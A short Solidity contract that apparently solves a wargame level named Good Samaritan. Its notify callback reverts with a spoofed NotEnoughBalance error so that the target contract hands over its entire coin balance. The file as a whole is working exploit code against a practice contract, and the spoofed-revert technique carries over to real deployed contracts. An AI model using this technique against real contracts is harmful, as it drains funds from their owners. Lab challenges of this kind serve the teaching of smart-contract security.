// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GoodSamaritan, Coin} from "./GoodSamaritan.sol";

error HackFailed();

contract GoodSamaritanHack {
    error NotEnoughBalance();

    GoodSamaritan private immutable target;
    Coin private immutable coin;

    constructor(address _target) {
        target = GoodSamaritan(_target);
        coin = Coin(target.coin());
    }

    function attack() external {
        target.requestDonation();
        if (coin.balances(address(this)) != 10 ** 6) revert HackFailed();
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
